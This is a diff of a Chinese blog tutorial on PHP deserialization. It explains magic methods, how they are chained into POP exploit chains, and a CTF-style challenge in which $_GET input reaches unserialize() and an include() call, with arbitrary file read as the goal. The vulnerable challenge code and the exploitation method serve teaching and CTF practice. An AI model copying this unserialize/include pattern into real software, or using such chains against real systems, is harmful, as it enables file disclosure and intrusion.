 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object is being called as a function with argument: <span class="subst">$arg</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>(<span class="string">&#x27;argument&#x27;</span>); <span class="comment">// 调用对象作为函数</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="成员访问相关"><a href="#成员访问相关" class="headerlink" title="成员访问相关"></a>成员访问相关</h2><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p><strong>定义</strong>：</p>
+<h2 id="成员访问相关">成员访问相关</h2>
+<h3 id="get">__get()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$name</code>：尝试访问的属性名。</li>
 </ul>
 <p><strong>用途</strong>：用于从不可访问的属性读取数据。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name; <span class="comment">// 输出: John</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p><strong>定义</strong>：</p>
+<h3 id="set">__set()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$name</code>：要设置的属性名。</li>
@@ -582,30 +657,29 @@
 </ul>
 <p><strong>用途</strong>：用于将数据写入不可访问的属性。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;name = <span class="string">&#x27;John&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p><strong>定义</strong>：</p>
+<h3 id="isset">__isset()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$name</code>：要检查的属性名。</li>
 </ul>
-<p><strong>用途</strong>：在不可访问的属性上调用 <code>isset()</code> 或 <code>empty()</code> 时触发。</p>
+<p><strong>用途</strong>：在不可访问的属性上调用 <code>isset()</code> 或
+<code>empty()</code> 时触发。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;name)); <span class="comment">// 输出: bool(true)</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p><strong>定义</strong>：</p>
+<h3 id="unset">__unset()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$name</code>：要销毁的属性名。</li>
 </ul>
-<p><strong>用途</strong>：在不可访问的属性上使用 <code>unset()</code> 时触发。</p>
+<p><strong>用途</strong>：在不可访问的属性上使用 <code>unset()</code>
+时触发。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;name);</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p><strong>定义</strong>：</p>
+<h3 id="call">__call()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$name</code>：调用的方法名。</li>
@@ -613,10 +687,9 @@
 </ul>
 <p><strong>用途</strong>：在<strong>对象上下文</strong>中调用<strong>不可访问</strong>或<strong>不存在</strong>的方法时触发。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling method &#x27;<span class="subst">$name</span>&#x27; with arguments: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">undefinedMethod</span>(<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>); <span class="comment">// 调用不可访问的方法</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><p><strong>定义</strong>：</p>
+<h3 id="callstatic">__callStatic()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$name</code>：调用的方法名。</li>
@@ -624,244 +697,352 @@
 </ul>
 <p><strong>用途</strong>：在<strong>静态上下文</strong>中调用<strong>不可访问</strong>或<strong>不存在</strong>的方法时触发。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling static method &#x27;<span class="subst">$name</span>&#x27; with arguments: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">MyClass</span>::<span class="title function_ invoke__">undefinedStaticMethod</span>(<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>); <span class="comment">// 调用不可访问的静态方法</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="回调函数相关"><a href="#回调函数相关" class="headerlink" title="回调函数相关"></a>回调函数相关</h2><h3 id="call-user-func、call-user-func-array"><a href="#call-user-func、call-user-func-array" class="headerlink" title="call_user_func、call_user_func_array"></a>call_user_func、call_user_func_array</h3><p><strong>定义</strong>：</p>
+<h2 id="回调函数相关">回调函数相关</h2>
+<h3
+id="call_user_funccall_user_func_array">call_user_func、call_user_func_array</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>)</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$param_arr</span>)</span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$callback</code>：要调用的回调函数。</li>
-<li><code>$args</code> 或 <code>$param_arr</code>：传递给回调函数的参数。</li>
+<li><code>$args</code> 或
+<code>$param_arr</code>：传递给回调函数的参数。</li>
 </ul>
 <p><strong>用途</strong>：用于在运行时调用回调函数，支持传递参数。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">myStaticMethod</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Static method called with argument: <span class="subst">$arg</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="string">&#x27;MyClass&#x27;</span>, <span class="string">&#x27;myStaticMethod&#x27;</span>), <span class="string">&#x27;argument&#x27;</span>);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;MyClass&#x27;</span>, <span class="string">&#x27;myStaticMethod&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;argument&#x27;</span>));</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h3><p>在对象反序列化后立即触发，用于初始化对象或进行其他必要的操作。</p>
+<h2 id="应用">应用</h2>
+<h3 id="起点">起点</h3>
+<p>在对象反序列化后立即触发，用于初始化对象或进行其他必要的操作。</p>
 <ul>
-<li>**<code>__destruct()</code>**：对象被销毁时触发。</li>
-<li>**<code>__wakeup()</code>**：在 <code>unserialize()</code> 时，如果存在 <code>__wakeup()</code> 方法，则会先调用它，预先准备对象需要的资源。</li>
-<li>**<code>__toString()</code>**：对象被当成字符串使用时触发，必须返回一个字符串。</li>
+<li><strong><code>__destruct()</code></strong>：对象被销毁时触发。</li>
+<li><strong><code>__wakeup()</code></strong>：在
+<code>unserialize()</code> 时，如果存在 <code>__wakeup()</code>
+方法，则会先调用它，预先准备对象需要的资源。</li>
+<li><strong><code>__toString()</code></strong>：对象被当成字符串使用时触发，必须返回一个字符串。</li>
 </ul>
-<h3 id="中间跳板"><a href="#中间跳板" class="headerlink" title="中间跳板"></a>中间跳板</h3><p>在利用链中起到中间过渡的作用，通常用于访问或修改对象的属性和方法，构造参数调用下一个魔术方法，直到执行到最终代码。</p>
+<h3 id="中间跳板">中间跳板</h3>
+<p>在利用链中起到中间过渡的作用，通常用于访问或修改对象的属性和方法，构造参数调用下一个魔术方法，直到执行到最终代码。</p>
 <ul>
-<li>**<code>__call()</code>**：在对象上下文中调用不可访问的方法时触发。</li>
-<li>**<code>__callStatic()</code>**：在静态上下文中调用不可访问的方法时触发。</li>
-<li>**<code>__get()</code>**：用于从不可访问的属性读取数据。</li>
-<li>**<code>__set()</code>**：用于将数据写入不可访问的属性。</li>
-<li>**<code>__isset()</code>**：在不可访问的属性上调用 <code>isset()</code> 或 <code>empty()</code> 时触发。</li>
-<li>**<code>__unset()</code>**：在不可访问的属性上使用 <code>unset()</code> 时触发。</li>
-<li>**<code>__invoke()</code>**：脚本尝试将对象调用为函数时触发。</li>
-<li>**<code>__toString()</code>**：当对象被当成字符串使用时触发。</li>
+<li><strong><code>__call()</code></strong>：在对象上下文中调用不可访问的方法时触发。</li>
+<li><strong><code>__callStatic()</code></strong>：在静态上下文中调用不可访问的方法时触发。</li>
+<li><strong><code>__get()</code></strong>：用于从不可访问的属性读取数据。</li>
+<li><strong><code>__set()</code></strong>：用于将数据写入不可访问的属性。</li>
+<li><strong><code>__isset()</code></strong>：在不可访问的属性上调用
+<code>isset()</code> 或 <code>empty()</code> 时触发。</li>
+<li><strong><code>__unset()</code></strong>：在不可访问的属性上使用
+<code>unset()</code> 时触发。</li>
+<li><strong><code>__invoke()</code></strong>：脚本尝试将对象调用为函数时触发。</li>
+<li><strong><code>__toString()</code></strong>：当对象被当成字符串使用时触发。</li>
 </ul>
-<h3 id="终点"><a href="#终点" class="headerlink" title="终点"></a>终点</h3><p>代码执行的最终点，在利用链的最后阶段被调用，通常用于执行具体的代码。</p>
+<h3 id="终点">终点</h3>
+<p>代码执行的最终点，在利用链的最后阶段被调用，通常用于执行具体的代码。</p>
 <ul>
-<li>**<code>__call</code>**：调用不可访问或不存在的方法时触发。</li>
-<li>**<code>call_user_func</code>、<code>call_user_func_array</code>**：在运行时调用回调函数，支持传递参数。</li>
+<li><strong><code>__call</code></strong>：调用不可访问或不存在的方法时触发。</li>
+<li><strong><code>call_user_func</code>、<code>call_user_func_array</code></strong>：在运行时调用回调函数，支持传递参数。</li>
 </ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>与反序列化无关的魔术方法或基础初始化方法。</p>
+<h3 id="其他">其他</h3>
+<p>与反序列化无关的魔术方法或基础初始化方法。</p>
 <ul>
-<li>**<code>__construct()</code>**：创建对象时触发。</li>
-<li>**<code>__sleep()</code>**：对象被序列化之前触发，返回一个包含需要序列化的属性名的数组。</li>
-<li>**<code>__autoload()</code>**：当代码中调用不存在的类时，会自动调用该方法。</li>
-<li>**<code>spl_autoload_register()</code>**：注册自动加载函数，替代 <code>__autoload()</code>。</li>
+<li><strong><code>__construct()</code></strong>：创建对象时触发。</li>
+<li><strong><code>__sleep()</code></strong>：对象被序列化之前触发，返回一个包含需要序列化的属性名的数组。</li>
+<li><strong><code>__autoload()</code></strong>：当代码中调用不存在的类时，会自动调用该方法。</li>
+<li><strong><code>spl_autoload_register()</code></strong>：注册自动加载函数，替代
+<code>__autoload()</code>。</li>
 </ul>
-<h1 id="反序列化基础利用"><a href="#反序列化基础利用" class="headerlink" title="反序列化基础利用"></a>反序列化基础利用</h1><h2 id="POP-链"><a href="#POP-链" class="headerlink" title="POP 链"></a>POP 链</h2><p>POP 链（Property-Oriented Programming Chain）是指从现有运行环境中寻找一系列的代码（通常是一些类的魔术方法），然后根据需求通过<strong>类的属性</strong>构造出一组连续的调用链。</p>
-<p>反序列化利用就是要找到合适的 POP 链。其实就是构造一条符合原代码需求的链条，去找到可以控制的属性或方法，从而构造 POP 链达到攻击的目的。</p>
+<h1 id="反序列化基础利用">反序列化基础利用</h1>
+<h2 id="pop-链">POP 链</h2>
+<p>POP 链（Property-Oriented Programming
+Chain）是指从现有运行环境中寻找一系列的代码（通常是一些类的魔术方法），然后根据需求通过<strong>类的属性</strong>构造出一组连续的调用链。</p>
+<p>反序列化利用就是要找到合适的 POP
+链。其实就是构造一条符合原代码需求的链条，去找到可以控制的属性或方法，从而构造
+POP 链达到攻击的目的。</p>
 <p>寻找POP链的思路：</p>
-<ol>
+<ol type="1">
 <li>寻找参数是否可控的 <code>unserialize()</code> 函数；</li>
-<li>寻找反序列化想要执行的目标函数，重点寻找魔术方法（比如 <code>__wakeup()</code> 和 <code>__destruct()</code> ）；</li>
+<li>寻找反序列化想要执行的目标函数，重点寻找魔术方法（比如
+<code>__wakeup()</code> 和 <code>__destruct()</code> ）；</li>
 <li>一层一层地研究目标在魔术方法中使用的属性和调用的方法，看看其中是否有我们可控的属性和方法；</li>
 <li>根据我们要控制的属性，构造序列化数据，发起攻击。</li>
 </ol>
 <p>例如下面这道例题：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vox</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$headset</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$pulse</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$pulse</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fun</span>(<span class="variable">$this</span>-&gt;headset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saw</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fearless</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gun</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fearless = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fearless . <span class="string">&#x27; You are in my range!&#x27;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gun[<span class="string">&#x27;gun&#x27;</span>]-&gt;fearless;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Saw&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_pain</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fearless) &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;fearless);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;fearless)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Does it hurt? That&#x27;s right&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fearless = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Petal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$seed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seed = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$sun</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$Nourishment</span> = <span class="variable language_">$this</span>-&gt;seed;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Nourishment</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ozo&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ozo&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$Saw</span> = <span class="keyword">new</span> <span class="title class_">Saw</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$Saw</span>-&gt;<span class="title function_ invoke__">_pain</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>可以构造如下 POP 链，最终实现任意文件读。 <img 
 
-<p>可以构造如下 POP 链，最终实现任意文件读。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/9a29e0f07ad1e6b92bc31f8dacc4908f.png"
-                      alt="在这里插入图片描述"
+                     data-src="images/9a29e0f07ad1e6b92bc31f8dacc4908f.png"
+                     
